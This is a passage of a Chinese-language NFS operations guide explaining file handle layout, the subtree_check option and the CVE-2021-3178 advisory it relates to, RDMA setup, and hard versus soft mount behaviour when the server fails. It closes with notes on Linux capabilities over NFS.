\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e2d\u200b\uff0c\u200b\u6587\u4ef6\u200b\u53e5\u67c4\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u4e3a\u200b <code>knfsd_fh</code>\uff0c\u200b\u5982\u4e0b\u200b\u6240\u793a\u200b\uff1a</p> <pre><code>struct knfsd_fh {\n    unsigned int    fh_size;    /*\n                                 * Points to the current size while\n                                 * building a new file handle.\n                                 */\n    union {\n        char        fh_raw[NFS4_FHSIZE];\n        struct {\n            u8      fh_version;     /* == 1 */\n            u8      fh_auth_type;   /* deprecated */\n            u8      fh_fsid_type;\n            u8      fh_fileid_type;\n            u32     fh_fsid[]; /* flexible-array member */\n        };\n    };\n};\n</code></pre> <p>\u200b\u4f8b\u5982\u200b\u6293\u5305\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u7531\u200b\u5185\u6838\u200b\u6001\u200b NFSv4 \u200b\u670d\u52a1\u5668\u8fd4\u56de\u200b\u7684\u200b\u6587\u4ef6\u200b\u53e5\u67c4\u200b\uff08\u200b\u5341\u516d\u8fdb\u5236\u200b\uff09\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <pre><code>01 00 07 01\nb0 18 06 00 00 00 00 00 6c f8 f6 54 9a 14 47 03\nbe 4e c5 a0 59 c9 f7 f8 16 2e 06 00 a5 70 74 83\n</code></pre> <p>\u200b\u4e0e\u200b union \u200b\u4e2d\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\u5bf9\u5e94\u200b\u3002\u200b\u6839\u636e\u200b fsid \u200b\u548c\u200b fileid type \u200b\u53ef\u4ee5\u200b\u63a8\u65ad\u200b <code>fh_fsid[]</code> \u200b\u7684\u200b\u524d\u200b 24 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5b58\u50a8\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4fe1\u606f\u200b\uff0c\u200b\u540e\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5b58\u50a8\u200b\u6587\u4ef6\u200b\u4fe1\u606f\u200b\u3002 inode \u200b\u7f16\u53f7\u200b\u540e\u200b\u662f\u200b generation number\uff0c\u200b\u7528\u4e8e\u200b\u68c0\u6d4b\u200b\u6587\u4ef6\u200b\u662f\u5426\u200b\u88ab\u200b\u4fee\u6539\u200b\u3002</p> <p>\u200b\u8be5\u200b\u6587\u4ef6\u200b inode \u200b\u7f16\u53f7\u200b\u4e3a\u200b 405014\uff0c\u200b\u5373\u200b 0x62e16\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u4ee5\u5c0f\u7aef\u5e8f\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5b58\u50a8\u200b\u5728\u200b\u6700\u540e\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u3002 \u200b\u540c\u65f6\u200b\uff0c\u200b\u88ab\u200b\u5bfc\u51fa\u200b\u76ee\u5f55\u200b\u7684\u200b inode \u200b\u7f16\u53f7\u200b\u4e3a\u200b 399536\uff0c\u200b\u5373\u200b 0x618b0\uff1b\u200b\u6240\u5904\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b UUID \u200b\u4e3a\u200b 6cf8f654-9a14-4703-be4e-c5a059c9f7f8\uff0c \u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u5b58\u50a8\u200b\u5728\u200b\u524d\u200b 24 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u5982\u679c\u200b NFS \u200b\u5171\u4eab\u200b\uff08\u200b\u5bfc\u51fa\u200b\uff09\u200b\u7684\u200b\u76ee\u5f55\u200b\u4e0d\u662f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u6839\u76ee\u5f55\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5185\u6838\u200b\u6001\u200b\u670d\u52a1\u5668\u200b\u5c31\u200b\u9700\u8981\u200b\u5224\u65ad\u200b\u5ba2\u6237\u7aef\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6587\u4ef6\u200b\u53e5\u67c4\u200b\u662f\u5426\u200b\u771f\u7684\u200b\u5728\u200b\u5171\u4eab\u200b\u7684\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002 \u200b\u8fd9\u200b\u4e00\u9879\u200b\u68c0\u67e5\u200b\u9700\u8981\u200b\u4ece\u6587\u4ef6\u200b\u7684\u200b inode \u200b\u4fe1\u606f\u200b\u4e0d\u505c\u200b\u5411\u4e0a\u200b\u67e5\u627e\u200b\u6765\u200b\u786e\u8ba4\u200b\u6587\u4ef6\u200b\u786e\u5b9e\u200b\u5728\u200b\u5171\u4eab\u200b\u7684\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u3002 \u200b\u800c\u200b <code>no_subtree_check</code> \u200b\u4f1a\u200b\u8df3\u200b\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u68c0\u67e5\u200b\u3002</p> <p>\u200b\u90e8\u5206\u200b\u53ef\u80fd\u200b\u5bf9\u200b\u51b3\u7b56\u200b\u6709\u200b\u5e2e\u52a9\u200b\u7684\u200b\u4fe1\u606f\u200b\u2014\u2014\u200b\u5728\u200b\u4f8b\u5982\u200b\u6709\u200b\u5927\u91cf\u6587\u4ef6\u200b\u91cd\u547d\u540d\u200b\u7684\u200b\u573a\u5408\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e0d\u5f97\u4e0d\u200b\u5173\u95ed\u200b\u5b50\u6811\u200b\u68c0\u67e5\u200b\uff1a</p> <ul> <li>Making Filesystems Exportable -- The Linux Kernel  documentation</li> <li>Network File System (NFS) | Ubuntu</li> <li>Linux NFS faq</li> </ul> <p>\u200b\u4ee5\u53ca\u200b\u76f8\u5173\u200b\u7684\u200b CVE \u200b\u4e0e\u200b\u4fee\u590d\u200b\u7684\u200b commit message\uff1a</p> <p>CVE-2021-3178:</p> <pre><code>\u200b\u5434\u5f02\u200b reported an information leak in the NFSv3 server.  When only\na subdirectory of a filesystem volume is exported, an NFS client\nlisting the exported directory would obtain a file handle to the\nparent directory, allowing it to access files that were not meant\nto be exported.\n\nEven after this update, it is still possible for NFSv3 clients to\nguess valid file handles and access files outside an exported\nsubdirectory, unless the \"subtree_check\" export option is enabled.\nIt is recommended that you do not use that option but only export\nwhole filesystem volumes.\n</code></pre> <p>nfsd4: readdirplus shouldn't return parent of export:</p> <pre><code>nfsd4: readdirplus shouldn't return parent of export\n\nIf you export a subdirectory of a filesystem, a READDIRPLUS on the root\nof that export will return the filehandle of the parent with the \"..\"\nentry.\n\nThe filehandle is optional, so let's just not return the filehandle for\n\"..\" if we're at the root of an export.\n\nNote that once the client learns one filehandle outside of the export,\nthey can trivially access the rest of the export using further lookups.\n\nHowever, it is also not very difficult to guess filehandles outside of\nthe export.  So exporting a subdirectory of a filesystem should\nconsidered equivalent to providing access to the entire filesystem.  To\navoid confusion, we recommend only exporting entire filesystems.\n\nReported-by: Youjipeng &lt;wangzhibei1999@gmail.com&gt;\nSigned-off-by: J. Bruce Fields &lt;bfields@redhat.com&gt;\nCc: stable@vger.kernel.org\nSigned-off-by: Chuck Lever &lt;chuck.lever@oracle.com&gt;\n</code></pre> RDMA \u200b\u652f\u6301\u200b\uff08\u200b\u670d\u52a1\u7aef\u200b\uff09 <p>NFS \u200b\u652f\u6301\u200b RDMA \u200b\u534f\u8bae\u200b\uff0c\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e86\u200b\u4e13\u7528\u200b RDMA \u200b\u5361\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\u51cf\u5c0f\u200b\u7f51\u7edc\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002 \uff08\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u672c\u5730\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b89\u88c5\u200b <code>rdma-core</code> \u200b\u5305\u200b\uff0c\u200b\u5176\u200b\u5305\u542b\u200b\u4e86\u200b Soft-RoCE \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5373\u200b\u8f6f\u4ef6\u200b\u6a21\u62df\u200b\u7684\u200b RDMA\uff1b <code>rdmacm-utils</code> \u200b\u5305\u200b\u5305\u542b\u200b\u4e86\u200b <code>rping</code> \u200b\u5de5\u5177\u200b\u7528\u4e8e\u200b\u6d4b\u8bd5\u200b RDMA \u200b\u8fde\u63a5\u200b\u3002 \u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b <code>rdma link</code> \u200b\u547d\u4ee4\u200b\u521b\u5efa\u200b\u8f6f\u4ef6\u200b\u6a21\u62df\u200b\u7684\u200b RDMA \u200b\u8bbe\u5907\u200b\u8bf7\u200b\u81ea\u884c\u200b\u641c\u7d22\u200b\uff09</p> <p>\u200b\u5728\u200b\u7cfb\u7edf\u200b\u80fd\u591f\u200b\u8bc6\u522b\u200b\u5230\u200b RDMA \u200b\u8bbe\u5907\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff1a</p> <pre><code>$ rdma link\nlink rxe0/1 state ACTIVE physical_state LINK_UP netdev enp1s0\n</code></pre> <p>\u200b\u7f16\u8f91\u200b <code>/etc/nfs/nfs.conf</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5728\u200b <code>[nfsd]</code> \u200b\u4e00\u6bb5\u200b\u8fdb\u884c\u200b RDMA \u200b\u7684\u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>[nfsd]\n# ...\nrdma=y\nrdma-port=20049\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u91cd\u542f\u200b <code>nfs-server</code> \u200b\u670d\u52a1\u200b\u5373\u53ef\u200b\u3002\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>/proc/fs/nfsd/portlist</code> \u200b\u786e\u8ba4\u200b NFS \u200b\u670d\u52a1\u5668\u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>$ cat /proc/fs/nfsd/portlist\nrdma 20049\nrdma 20049\ntcp 2049\ntcp 2049\n</code></pre>"},{"location":"ops/storage/network/#nfs-client","title":"\u5ba2\u6237\u7aef\u200b\u914d\u7f6e","text":""},{"location":"ops/storage/network/#nfs-client-mount","title":"\u6302\u8f7d\u200b\u4e0e\u200b\u6389\u7ebf\u200b\u5904\u7406","text":"<p>\u200b\u6302\u8f7d\u200b NFS\uff08\u200b\u8868\u9762\u200b\u4e0a\u200b\uff09\u200b\u662f\u200b\u4e00\u4ef6\u200b\u5f88\u200b\u7b80\u5355\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff1a</p> <pre><code>$ sudo mount -t nfs localhost:/srv/abcde /mnt/nfs\n$ mount | grep nfs\nnfsd on /proc/fs/nfsd type nfsd (rw,relatime)\nlocalhost:/srv/abcde on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp6,timeo=600,retrans=2,sec=sys,clientaddr=::1,local_lock=none,addr=::1)\n</code></pre> <p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b\u53c2\u6570\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u4f7f\u7528\u200b NFS over RDMA \u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u6307\u5b9a\u200b\u534f\u8bae\u200b\u4e0e\u200b\u7aef\u53e3\u53f7\u200b\uff1a</p> <pre><code>$ sudo mount -t nfs -o proto=rdma,port=20049 192.168.122.47:/srv/abcde /mnt/nfs\n$ mount | grep nfs\n192.168.122.47:/srv/abcde on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=rdma,port=20049,timeo=600,retrans=2,sec=sys,clientaddr=192.168.122.47,local_lock=none,addr=192.168.122.47)\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u67e5\u770b\u200b\u67d0\u4e2a\u200b IP \u200b\u5bfc\u51fa\u200b\u7684\u200b\u76ee\u5f55\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>showmount</code>\uff1a</p> <pre><code>$ showmount -e 10.1.2.3\nExport list for 10.1.2.3:\n/mnt      10.0.0.0/8,100.0.0.0/8\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u8fd8\u662f\u200b <code>hard</code> \u200b\u4e0e\u200b <code>soft</code>\uff08\u200b\u6216\u8005\u200b Linux 5.6 \u200b\u4e4b\u540e\u200b\u65b0\u589e\u200b\u7684\u200b <code>softerr</code>\uff09\u200b\u7684\u200b\u9009\u62e9\u200b\u3002 NFS \u200b\u5ba2\u6237\u7aef\u200b\u5728\u200b\u6bcf\u6b21\u200b\u91cd\u8bd5\u200b\u4e4b\u524d\u200b\u4f1a\u200b\u7b49\u5f85\u200b <code>timeo</code> / 10\uff08\u200b\u9ed8\u8ba4\u200b 600 / 10 = 60\uff09\u200b\u79d2\u200b\u3002 \u200b\u5728\u200b <code>hard</code> \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u670d\u52a1\u5668\u200b\u6ca1\u6709\u54cd\u5e94\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5ba2\u6237\u7aef\u200b\u4f1a\u200b\u6c38\u8fdc\u200b\u91cd\u8bd5\u200b\u4e0b\u53bb\u200b\uff0c\u200b\u76f4\u5230\u200b\u670d\u52a1\u5668\u200b\u6062\u590d\u200b\uff1b \u200b\u800c\u200b\u5728\u200b <code>soft</code> \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5728\u200b\u7ecf\u8fc7\u200b <code>retrans</code>\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 2\uff09\u200b\u6b21\u200b\u91cd\u8bd5\u200b\u540e\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u4f1a\u200b\u653e\u5f03\u200b\uff0c\u200b\u5e76\u200b\u5411\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u8fd4\u56de\u200b\u9519\u8bef\u200b\u3002 \uff08\u200b\u4f46\u662f\u200b\u5e94\u7528\u200b\u80fd\u200b\u4e0d\u80fd\u200b\u6b63\u786e\u200b\u5904\u7406\u9519\u8bef\u200b\uff0c\u200b\u5c31\u662f\u200b\u53e6\u5916\u200b\u4e00\u200b\u56de\u4e8b\u200b\u4e86\u200b\uff09</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u51fa\u4e8e\u200b\u4fdd\u62a4\u200b\u6570\u636e\u5b8c\u6574\u6027\u200b\u7684\u200b\u8003\u8651\u200b\uff0c<code>mount</code> \u200b\u4f1a\u200b\u9009\u62e9\u200b <code>hard</code> \u200b\u6a21\u5f0f\u200b\u3002 \u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u7f51\u7edc\u200b\u6216\u8005\u200b NFS \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7a33\u5b9a\u6027\u200b\u4e0d\u591f\u200b\u7684\u8bdd\u200b\uff0c\u200b\u7ed3\u679c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u68d8\u624b\u200b\u3002 \u200b\u8ba9\u200b\u6211\u4eec\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u91cc\u200b\u8bd5\u4e00\u8bd5\u200b\uff08\u200b\u8bf7\u200b\u5148\u200b\u4fdd\u5b58\u200b\u5168\u90e8\u200b\u6570\u636e\u200b\uff01\uff09\uff1a</p> <pre><code>$ sudo mount -t nfs localhost:/srv/abcde /mnt/nfs\n$ sudo systemctl stop nfs-server\n$ echo \"test\" &gt; /mnt/nfs/testfile\n^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b <code>echo</code> \u200b\u88ab\u200b\u963b\u585e\u4f4f\u200b\u4e86\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53d1\u9001\u200b SIGINT \u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u7ec8\u6b62\u200b\u3002\u200b\u6b64\u65f6\u200b\u7684\u200b bash \u200b\u8fdb\u7a0b\u200b\u5904\u4e8e\u200b D \u200b\u72b6\u6001\u200b\uff0c\u200b\u6808\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>$ sudo cat /proc/4971/stack\n[&lt;0&gt;] rpc_wait_bit_killable+0xd/0x60 [sunrpc]\n[&lt;0&gt;] nfs4_run_open_task+0x152/0x1e0 [nfsv4]\n[&lt;0&gt;] nfs4_do_open+0x25b/0xc20 [nfsv4]\n[&lt;0&gt;] nfs4_atomic_open+0xf4/0x100 [nfsv4]\n[&lt;0&gt;] nfs_atomic_open+0x215/0x6a0 [nfs]\n[&lt;0&gt;] path_openat+0x6d7/0x1260\n[&lt;0&gt;] do_filp_open+0xaf/0x160\n[&lt;0&gt;] do_sys_openat2+0xaf/0x170\n[&lt;0&gt;] __x64_sys_openat+0x6a/0xa0\n[&lt;0&gt;] do_syscall_64+0x58/0xc0\n[&lt;0&gt;] entry_SYSCALL_64_after_hwframe+0x64/0xce\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b\u6808\u9876\u200b\u662f\u200b killable \u200b\u7684\u200b\uff0c\u200b\u53d1\u9001\u200b SIGKILL \u200b\u4ecd\u200b\u53ef\u200b\u6b63\u5e38\u200b\u7ec8\u6b62\u200b\u8fdb\u7a0b\u200b\uff1a</p> <pre><code>$ kill -9 4971\n$ sudo cat /proc/4971/stack\ncat: /proc/4971/stack: No such file or directory\n</code></pre> <p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u8fdb\u7a0b\u200b\u5728\u200b\u4f7f\u7528\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e5f\u200b\u80fd\u200b\u2026\u2026\u200b\u6b63\u5e38\u200b\uff08\uff1f\uff09umount\uff1a</p> <pre><code>$ sudo umount /mnt/nfs\n^C\n$ mount | grep nfs\nnfsd on /proc/fs/nfsd type nfsd (rw,relatime)\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u6709\u200b\u7684\u8bdd\u200b\uff0cumount \u200b\u4f1a\u200b\u62d2\u7edd\u200b\uff0c\u200b\u5373\u4f7f\u200b\u52a0\u4e0a\u200b <code>-f</code> \u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u64cd\u4f5c\u200b\uff1a</p> <pre><code>$ sudo umount /mnt/nfs\numount.nfs4: /mnt/nfs: target is busy\n$ sudo umount -f /mnt/nfs\numount.nfs4: /mnt/nfs: target is busy\n</code></pre> <p>\u200b\u5373\u4f7f\u200b\u770b\u4f3c\u200b\u6709\u200b\u529e\u6cd5\u200b\u80fd\u200b\u4ece\u200b hard \u200b\u4e2d\u200b\u5168\u8eab\u800c\u9000\u200b\uff08\u200b\u6740\u6389\u200b\u5168\u90e8\u200b\u8bbf\u95ee\u200b\u8fdb\u7a0b\u200b\u518d\u200b umount\uff09\uff0c\u200b\u4f46\u662f\u200b\u4ecd\u7136\u200b\u9700\u8981\u200b\u5c0f\u5fc3\u200b\uff1a \u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u662f\u200b <code>home</code> \u200b\u76ee\u5f55\u200b\u5728\u200b NFS \u200b\u4e0a\u200b\uff0c\u200b\u800c\u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u65f6\u200b\u53c8\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b <code>~/.bashrc</code> \u200b\u7b49\u200b\u6587\u4ef6\u200b\u3002 \u200b\u5982\u679c\u200b\u6b64\u65f6\u200b NFS \u200b\u670d\u52a1\u5668\u200b\u4e0d\u53ef\u200b\u7528\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6240\u6709\u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u90fd\u200b\u4f1a\u200b\u5361\u4f4f\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u80fd\u200b\u767b\u5f55\u200b root \u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u200b\u53ea\u6709\u200b\u5f3a\u5236\u200b\u91cd\u542f\u200b\u4e00\u79cd\u200b\u9009\u62e9\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u80fd\u591f\u200b\u767b\u5f55\u200b\uff0c\u200b\u4f46\u662f\u200b\u53d1\u73b0\u200b\u6ca1\u6709\u200b\u529e\u6cd5\u200b\u6740\u5149\u200b\u6240\u6709\u200b\u8bbf\u95ee\u200b NFS \u200b\u7684\u200b\u8fdb\u7a0b\u200b\uff08\u200b\u53ef\u80fd\u200b\u5728\u200b\u4e0d\u505c\u200b\u51fa\u73b0\u200b\u65b0\u200b\u7684\u200b\uff09\uff0c\u200b\u4e00\u79cd\u200b\u59a5\u534f\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b lazy unmount\uff1a</p> <pre><code>$ sudo umount -l /mnt/nfs\n$\n</code></pre> <p>\u200b\u6b64\u65f6\u200b <code>/mnt/nfs</code> \u200b\u4e0d\u4f1a\u200b\u66b4\u9732\u200b\u4e3a\u200b\u6302\u8f7d\u200b\u70b9\u200b\uff0c\u200b\u4f46\u662f\u200b\u5df2\u6709\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5982\u679c\u200b\u6301\u6709\u200b\u6302\u8f7d\u200b\u70b9\u5185\u200b\u7684\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff0c\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u8bbf\u95ee\u200b\u3002 \u200b\u6b64\u65f6\u200b\u7684\u200b\u95ee\u9898\u200b\u6302\u8f7d\u200b\u70b9\u200b\u4e8b\u5b9e\u4e0a\u200b\u8fd8\u662f\u200b\u6ca1\u6709\u200b\u88ab\u200b\u5378\u8f7d\u200b\uff0c\u200b\u53ea\u662f\u200b\u4e4b\u540e\u200b\u65b0\u200b\u7684\u200b\u8bbf\u95ee\u200b\u4e0d\u4f1a\u200b\u518d\u200b\u6d89\u53ca\u200b NFS \u200b\u4e86\u200b\u3002 \u200b\u5728\u200b\u7528\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u300c\u200b\u89e3\u51b3\u200b\u300d\u200b\u95ee\u9898\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5c3d\u5feb\u200b\u91cd\u542f\u200b\u670d\u52a1\u5668\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c<code>intr</code> \u200b\u53c2\u6570\u200b\u5728\u200b\u73b0\u5728\u200b\u80fd\u200b\u78b0\u5230\u200b\u7684\u200b\u5185\u6838\u200b\uff082.6.25+\uff09\u200b\u4e2d\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u610f\u4e49\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u8bbe\u7f6e\u200b\u3002</p>"},{"location":"ops/storage/network/#nfs-client-other","title":"\u5176\u4ed6\u200b\u95ee\u9898","text":"<p>NFS \u200b\u5c3d\u7ba1\u200b\u4f7f\u7528\u200b\u8d77\u6765\u200b\u50cf\u200b\u672c\u5730\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u4e0a\u200b\u4ecd\u7136\u200b\u5b58\u5728\u200b\u4e00\u4e9b\u200b\u5dee\u5f02\u200b\u3002</p> <p>NFS \u200b\u4e0e\u200b capability \u200b\u95ee\u9898\u200b</p> <p>\u200b\u5728\u200b\u6392\u67e5\u200b NFS \u200b\u5171\u4eab\u200b\u76ee\u5f55\u200b\u4e0a\u200b\u6587\u4ef6\u200b\u79fb\u52a8\u200b\u5931\u8d25\u200b\u7684\u200b\u95ee\u9898\u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u5728\u200b NFS \u200b\u6302\u8f7d\u200b\u73af\u5883\u200b\u4e0b\u200b\u6267\u884c\u200b\u7279\u5b9a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u64cd\u4f5c\u200b\u65f6\u200b\uff0cLinux capability \u200b\u673a\u5236\u200b\u7684\u200b\u884c\u4e3a\u200b\u4e0e\u200b\u9884\u671f\u200b\u6709\u6240\u4e0d\u540c\u200b\u3002</p> <ul> <li>\u200b\u5f53\u200b\u5c1d\u8bd5\u200b\u5728\u200b NFS \u200b\u6302\u8f7d\u200b\u7684\u200b\u8def\u5f84\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\u65f6\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u8fdb\u7a0b\u200b\u7684\u200b capability \u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u4f20\u9012\u200b\u5230\u200b NFS \u200b\u670d\u52a1\u5668\u7aef\u200b\u8fdb\u884c\u200b\u6743\u9650\u200b\u68c0\u67e5\u200b\u3002\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u4e00\u4e9b\u200b\u5728\u200b\u672c\u5730\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\u56e0\u200b\u8fdb\u7a0b\u200b\u5177\u5907\u200b\u7279\u5b9a\u200b capability \u200b\u800c\u200b\u6210\u529f\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5728\u200b NFS \u200b\u73af\u5883\u200b\u4e0b\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5931\u8d25\u200b\uff0c\u200b\u56e0\u4e3a\u200b NFS \u200b\u5e76\u200b\u4e0d\u200b\u652f\u6301\u200b Linux Capabilities\u3002</li> <li>\u200b\u5728\u200b Linux \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u79fb\u52a8\u200b\u4e00\u4e2a\u200b\u76ee\u5f55\u200b\uff08\u200b\u4f8b\u5982\u200b\u5c06\u200b\u76ee\u5f55\u200b A \u200b\u4ece\u200b\u76ee\u5f55\u200b B \u200b\u4e0b\u200b\u79fb\u52a8\u200b\u5230\u200b\u76ee\u5f55\u200b C \u200b\u4e0b\u200b\uff0c\u200b\u5373\u200b\u76ee\u5f55\u200b\u7ed3\u6784\u200b\u4ece\u200b B/A \u200b\u53d8\u4e3a\u200b\u4e86\u200b C/A\uff09\u200b\u4e0d\u4ec5\u200b\u9700\u8981\u200b\u5bf9\u200b\u6e90\u76ee\u5f55\u200b B \u200b\u548c\u200b\u76ee\u6807\u76ee\u5f55\u200b C \u200b\u90fd\u200b\u5177\u5907\u200b\u5199\u200b\u6743\u9650\u200b\uff0c\u200b\u88ab\u200b\u79fb\u52a8\u200b\u7684\u200b\u76ee\u5f55\u200b A \u200b\u672c\u8eab\u200b\u4e5f\u200b\u9700\u8981\u200b\u6709\u200b\u5199\u200b\u6743\u9650\u200b\u3002\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u4e0e\u200b\u79fb\u52a8\u200b\u6587\u4ef6\u200b\u65f6\u200b\u88ab\u200b\u79fb\u52a8\u200b\u6587\u4ef6\u200b\u65e0\u9700\u200b\u5199\u200b\u6743\u9650\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0d\u540c\u200b\u3002</li> <li>\u200b\u7136\u800c\u200b\uff0c\u200b\u5982\u679c\u200b\u6267\u884c\u200b\u79fb\u52a8\u200b\u64cd\u4f5c\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u62e5\u6709\u200b <code>cap_dac_override</code> \u200b\u8fd9\u4e2a\u200b capability\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u7ed5\u8fc7\u200b\u5bf9\u200b\u88ab\u200b\u79fb\u52a8\u200b\u76ee\u5f55\u200b\u5199\u200b\u6743\u9650\u200b\u7684\u200b\u68c0\u67e5\u200b\u3002</li> <li>\u200b\u5728\u200b\u5b9e\u9645\u200b\u95ee\u9898\u200b\u573a\u666f\u200b\u4e2d\u200b\uff0c\u200b\u5c3d\u7ba1\u200b\u6267\u884c\u200b\u64cd\u4f5c\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5177\u5907\u200b <code>cap_dac_override</code> capability\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b NFS \u200b\u4e0d\u4f1a\u200b\u4f20\u9012\u200b\u8fdb\u7a0b\u200b\u7684\u200b capability\uff0c\u200b\u5bfc\u81f4\u200b\u76ee\u5f55\u200b\u79fb\u52a8\u200b\u64cd\u4f5c\u200b\u672a\u80fd\u200b\u6210\u529f\u200b\u7ed5\u8fc7\u200b\u6743\u9650\u200b\u68c0\u67e5\u200b\u800c\u200b\u5931\u8d25\u200b\u3002</li> </ul> <p>NFS 